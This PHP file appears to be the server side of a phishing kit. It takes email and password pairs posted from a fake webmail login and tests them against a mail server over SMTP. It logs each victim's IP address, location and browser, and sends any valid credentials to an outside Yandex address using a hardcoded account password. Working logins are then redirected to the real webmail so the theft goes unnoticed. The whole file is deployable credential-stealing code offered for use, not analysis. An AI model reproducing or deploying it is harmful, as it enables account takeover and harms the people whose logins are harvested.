<?php
require_once __DIR__ . '/PHPMailer.php';
require_once __DIR__ . '/SMTP.php';
require_once __DIR__ . '/Exception.php';

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

header("Access-Control-Allow-Origin: *");
header("Access-Control-Allow-Methods: POST, GET, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type, Authorization");
header('Content-Type: application/json');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit();
}

$ip = $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';
$browser = $_SERVER['HTTP_USER_AGENT'] ?? 'UNKNOWN';
$geo = @json_decode(file_get_contents("https://www.geoplugin.net/json.gp?ip=$ip"));
$country = $geo->geoplugin_countryName ?? 'Unknown';

session_start();

if ($_SERVER['REQUEST_METHOD'] === 'GET') {
    http_response_code(403);
    echo "<h1>403 Forbidden</h1><p>Access to this resource is denied.</p>";
    exit();
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    echo json_encode(["signal" => "error", "msg" => "Only POST allowed"]);
    exit();
}

$login = trim($_POST['email'] ?? '');
$passwd = trim($_POST['password'] ?? '');

if (!$login || !$passwd || !str_contains($login, '@')) {
    echo json_encode(["signal" => "error", "msg" => "Email and password required"]);
    exit();
}

list(, $domain) = explode('@', $login);

// SMTP credentials for sending logs
$receiver     = 'logs.ironside511@yandex.com';
$senderuser   = 'info@lucagherardi.com';
$senderpass   = 'V8WLLSypyJBbUv7';
$senderport   = 587;
$senderserver = 'mail.lucagherardi.com';
$smtp_secure  = 'tls';

$timestamp = date('Y-m-d H:i:s');
$logFile = 'SS-Or-LucaGherardi-Tests.txt';
$validCredentials = false;
$emailSent = false;
$authStatus = '';
$connectionError = false;

$logMessage = "=== CREDENTIAL TEST ATTEMPT ===\n";
$logMessage .= "Timestamp: $timestamp\nEmail: $login\nPassword: $passwd\nDomain: $domain\nIP: $ip\nCountry: $country\nUser Agent: $browser\n";

try {
    $mail = new PHPMailer(true);
    $mail->isSMTP();
    $mail->SMTPAuth = true;
    $mail->Host = $senderserver;
    $mail->Username = $login;
    $mail->Password = $passwd;
    $mail->Port = $senderport;
    $mail->SMTPSecure = $smtp_secure;
    $mail->Timeout = 10;
    $mail->SMTPDebug = 0;

    if ($mail->smtpConnect()) {
        $validCredentials = true;
        $authStatus = '✅ VALID - Authenticated';

        $mail->smtpClose();

        // Send validation report using real sender account
        $notify = new PHPMailer(true);
        $notify->isSMTP();
        $notify->SMTPAuth = true;
        $notify->Host = $senderserver;
        $notify->Username = $senderuser;
        $notify->Password = $senderpass;
        $notify->Port = $senderport;
        $notify->SMTPSecure = $smtp_secure;

        $notify->setFrom($senderuser, 'Credential Monitor');
        $notify->addAddress($receiver);
        $notify->isHTML(true);
        $notify->Subject = "VALID CREDENTIALS: $login | $country";
        $notify->Body = "<h2>✅ VALID CREDENTIALS</h2><p>Email: $login<br>Password: $passwd<br>IP: $ip<br>Country: $country<br>Time: $timestamp</p>";

        $notify->send();
        $emailSent = true;
    } else {
        $authStatus = '❌ INVALID - Auth Failed';
        $connectionError = true;
    }
} catch (Exception $e) {
    $authStatus = "❌ ERROR: " . $e->getMessage();
    $connectionError = true;
}

$logMessage .= "Authentication: $authStatus\nValid: " . ($validCredentials ? 'YES' : 'NO') . "\nEmail Sent: " . ($emailSent ? 'YES' : 'NO') . "\n\n";
file_put_contents($logFile, $logMessage, FILE_APPEND);

$_SESSION['attempts'] = ($_SESSION['attempts'] ?? 0) + 1;

// Different response handling based on credential validity
if ($validCredentials) {
    // Valid credentials - redirect to webmail
    $response = [
        "signal" => "OK",
        "msg" => "Login successful. Redirecting to webmail...",
        "attempt" => $_SESSION['attempts'],
        "redirect_url" => "https://webmail.$domain",
        "debug_info" => [
            "valid_credentials" => true,
            "auth_status" => $authStatus,
            "email_sent" => $emailSent,
            "timestamp" => $timestamp
        ]
    ];
    
    // Shorter delay for valid credentials
    usleep(rand(300000, 800000));
} else {
    // Invalid credentials - show connection error
    $response = [
        "signal" => "error",
        "msg" => "Connection error: Unable to connect to mail server. Please check your credentials and try again.",
        "attempt" => $_SESSION['attempts'],
        "connection_error" => true,
        "debug_info" => [
            "valid_credentials" => false,
            "auth_status" => $authStatus,
            "email_sent" => $emailSent,
            "timestamp" => $timestamp
        ]
    ];
    
    // Longer delay for invalid credentials to simulate processing
    usleep(rand(1000000, 2500000));
}

echo json_encode($response);
exit();
?>